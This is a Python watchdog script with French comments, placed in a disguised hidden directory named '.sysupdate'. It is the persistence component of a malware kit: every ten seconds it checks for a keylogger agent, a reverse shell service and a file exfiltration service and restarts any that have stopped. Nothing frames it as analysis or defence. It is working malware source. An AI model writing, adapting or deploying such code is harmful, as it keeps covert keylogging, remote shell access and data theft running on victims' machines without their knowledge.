#!/usr/bin/python3
# /opt/.sysupdate/watchdog.py

import os
import time
import subprocess

# Chemins absolus des scripts surveillés
KEYLOGGER_PATH = "/opt/.sysupdate/keylogger_agent.py"
REVERSE_SHELL_PATH = "/opt/.sysupdate/reverse_shell_service.py"
FILE_EXFIL_PATH = "/opt/.sysupdate/file_extraction_service.py"

def is_process_running(script_path):
    """
    Vérifie si un processus dont la commande contient 'script_path' est en cours d'exécution.
    Retourne True si le processus est trouvé, sinon False.
    """
    try:
        # 'pgrep -f' recherche dans toute la ligne de commande
        result = subprocess.check_output(["pgrep", "-f", script_path])
        return bool(result.strip())
    except subprocess.CalledProcessError:
        # pgrep renvoie une erreur si aucun processus n'est trouvé
        return False

def restart_service(script_path):
    """
    Tente de relancer le script indiqué via Python.
    """
    if not os.path.exists(script_path):
        print(f"[WARNING] Le script {script_path} est introuvable.")
        return

    try:
        subprocess.Popen(["/usr/bin/python3", script_path])
        print(f"[INFO] Redémarrage de {script_path}")
    except Exception as e:
        print(f"[ERROR] Impossible de redémarrer {script_path} : {e}")

def main():
    while True:
        # Vérification et redémarrage du Keylogger
        if not os.path.exists(KEYLOGGER_PATH) or not is_process_running(KEYLOGGER_PATH):
            print(f"[WATCHDOG] Keylogger non trouvé ou arrêté. Tentative de redémarrage...")
            restart_service(KEYLOGGER_PATH)
            
        # Vérification et redémarrage du Reverse Shell
        if not os.path.exists(REVERSE_SHELL_PATH) or not is_process_running(REVERSE_SHELL_PATH):
            print(f"[WATCHDOG] Reverse shell non trouvé ou arrêté. Tentative de redémarrage...")
            restart_service(REVERSE_SHELL_PATH)
            
        # Vérification et redémarrage du File Extraction Service
        if not os.path.exists(FILE_EXFIL_PATH) or not is_process_running(FILE_EXFIL_PATH):
            print(f"[WATCHDOG] File extraction non trouvé ou arrêté. Tentative de redémarrage...")
            restart_service(FILE_EXFIL_PATH)
            
        # Pause de 10 secondes avant la prochaine vérification
        time.sleep(10)

if __name__ == "__main__":
    main()
